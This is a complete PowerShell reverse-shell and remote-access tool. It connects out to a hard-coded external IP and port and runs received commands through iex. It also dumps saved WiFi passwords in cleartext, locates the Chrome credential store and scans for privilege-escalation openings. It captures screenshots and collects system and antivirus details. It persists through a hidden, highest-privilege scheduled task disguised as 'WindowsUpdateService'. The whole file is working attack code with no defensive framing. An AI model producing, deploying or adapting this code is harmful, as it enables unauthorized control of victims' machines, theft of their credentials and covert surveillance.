# reverse_shell.ps1 - Persistent reverse shell with advanced features
$serverIP = "147.185.221.31"  # ← UPDATE WITH YOUR ARCH IP
$serverPort = 47034
$reconnectDelay = 15  # Seconds to wait before reconnecting
$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"

# Function to get detailed system information
function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $domain = (Get-WmiObject Win32_ComputerSystem).Domain
    $ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
    $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object -ExpandProperty displayName
    return "SYSINFO:$hostname|$username|$os|$domain|$ipAddress|$antivirus"
}

# Function to dump WiFi passwords
function Get-WifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    $results = @()
    
    foreach ($profile in $wifiProfiles) {
        $profileInfo = netsh wlan show profile name="$profile" key=clear
        $password = ($profileInfo | Select-String "Key Content").ToString().Split(":")[1].Trim()
        $results += "WIFI:$profile|$password"
    }
    
    return $results -join "`n"
}

# Function to dump browser credentials (Chrome)
function Get-BrowserCredentials {
    $results = @()
    
    try {
        # Chrome credentials path
        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromePath) {
            # This is a simplified approach - real implementation would require SQLite and decryption
            $results += "CHROME:Credentials found at $chromePath (decryption required)"
        }
    } catch { }

    return $results -join "`n"
}

# Function to check for privilege escalation vectors
function Get-PrivEscVectors {
    $results = @()
    
    # Check for unquoted service paths
    $services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"' }
    foreach ($service in $services) {
        $results += "PRIVESC:Unquoted service path - $($service.Name): $($service.PathName)"
    }
    
    # Check for always install elevated
    $alwaysInstallElevated = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue).AlwaysInstallElevated
    if ($alwaysInstallElevated -eq 1) {
        $results += "PRIVESC:AlwaysInstallElevated enabled"
    }
    
    return $results -join "`n"
}

# Function to establish persistence
function Set-Persistence {
    try {
        # Copy self to persistent location
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $localPayloadPath -Force
        
        # Create scheduled task for persistence
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPayloadPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
        Register-ScheduledTask -TaskName "WindowsUpdateService" -InputObject $task -Force
        
        return "PERSISTENCE:Scheduled task created successfully"
    } catch {
        return "PERSISTENCE:Error - $($_.Exception.Message)"
    }
}

# Function to take a screenshot
function Get-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
        
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $memoryStream.ToArray()
        $base64 = [Convert]::ToBase64String($bytes)
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $memoryStream.Dispose()
        
        return "SCREENSHOT:$base64"
    } catch {
        return "SCREENSHOT:Error - $($_.Exception.Message)"
    }
}

# Function to handle special commands
function Invoke-SpecialCommand {
    param($Command)
    
    switch -Regex ($Command) {
        "^!wifi" { return Get-WifiPasswords }
        "^!browsers" { return Get-BrowserCredentials }
        "^!privesc" { return Get-PrivEscVectors }
        "^!persist" { return Set-Persistence }
        "^!screenshot" { return Get-Screenshot }
        "^!sysinfo" { return Get-SystemInfo }
        default { return "ERROR:Unknown special command" }
    }
}

# Main persistent loop (NEVER EXITS)
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($serverIP, $serverPort)
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        $reader = New-Object System.IO.StreamReader($stream)
        
        # Send system info upon connection
        $writer.WriteLine((Get-SystemInfo))
        
        # Command execution loop
        while ($true) {
            try {
                $command = $reader.ReadLine()
                if (-not $command) { break }  # Server closed connection
                
                if ($command -eq "exit") { break }
                
                # Check if it's a special command
                if ($command -match "^!") {
                    $result = Invoke-SpecialCommand $command
                    $writer.WriteLine($result)
                    continue
                }
                
                # Execute regular command
                $result = iex $command 2>&1 | Out-String
                $writer.WriteLine($result)
            }
            catch {
                # Send error but KEEP CONNECTION ALIVE
                $errorOutput = "ERROR: $($_.Exception.Message)`n"
                $writer.WriteLine($errorOutput)
            }
        }
    }
    catch {
        # Connection failed, but we'll retry
    }
    finally {
        if ($client) { $client.Close() }
    }
    
    # Wait before reconnecting
    Start-Sleep -Seconds $reconnectDelay
}
